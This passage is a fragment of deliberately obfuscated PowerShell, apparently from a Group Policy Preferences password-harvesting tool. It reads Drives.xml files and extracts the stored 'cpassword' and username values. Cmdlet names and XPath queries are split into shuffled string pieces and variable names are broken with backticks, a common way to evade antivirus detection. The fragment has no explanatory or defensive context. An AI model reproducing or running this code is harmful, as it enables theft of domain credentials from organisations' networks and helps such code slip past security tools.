                    }
  
                    ("{2}{3}{1}{0}"-f 'ml','x','Drives','.') { 
                        ${cPaSs`Wo`RD} += , ${x`Ml} | &('S'+'elect-X'+'ml') ("{1}{4}{0}{8}{6}{5}{7}{9}{3}{2}"-f 's/Dri','/Dr','d','passwor','ive','r','pe','ties/','ve/Pro','@c') | &('Sel'+'ect'+'-Obj'+'ect') -Expand No`de | &('Fo'+'rE'+'ac'+'h-Obj'+'ect') {${_}."vA`Lue"}
                        ${uS`Er`NAMe} += , ${x`ML} | &('Sele'+'c'+'t-Xml') ("{1}{7}{9}{8}{0}{5}{6}{3}{4}{2}"-f 'pe','/','e','er','nam','rti','es/@us','D','Drive/Pro','rives/') | &('S'+'el'+'ect-Ob'+'ject') -Expand No`DE | &('F'+'orE'+'ach-'+'O'+'bject') {${_}."VAL`Ue"}
